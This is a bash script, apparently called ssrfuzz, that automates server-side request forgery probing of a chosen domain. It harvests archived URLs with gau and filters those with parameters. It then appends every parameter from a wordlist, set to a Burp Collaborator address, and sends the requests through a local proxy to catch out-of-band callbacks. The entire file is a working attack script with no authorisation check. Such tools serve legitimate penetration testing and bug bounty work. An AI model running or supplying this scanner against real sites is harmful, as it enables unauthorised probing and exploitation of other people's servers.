#!/bin/bash
# ssrfuzz by redfr0g
# credits to Santosh Kumar Sha

if [ -z "$1" ]
  then
    echo "Usage: ./ssrfuzz.sh <domain> <burp collaborator link> <parameter list>"
fi

# Get args
domain=$1
collaborator=$2
wordlist=$3
output="$domain-$(date +'%m-%d-%Y').txt"

# Find known URLs
echo "[+] Finding URLs for domain $domain"
gau -subs $domain > $output
echo "[+] Found $(wc -l < $output) URLs"

# Grep urls with parameters
echo "[+] Extracting URLs with parameters"
cat $output | grep "=" | sort -u | grep "?" | httpx -silent > fuzz.txt
echo "[+] Got $(wc -l < fuzz.txt) fuzzable URLs"

echo "[+] Fuzzing parameters (this may take a while)..."
# Fuzz with Collaborator link and custom URL parameters wordlist (i.e. from ParamMiner)
xargs -a $wordlist -I@ bash -c 'for url in $(cat fuzz.txt); do echo "$url&@='http://$collaborator'";done' | httpx -silent -http-proxy http://127.0.0.1:8080

echo "[+] Finished! Check Burp Collaborator for any connections"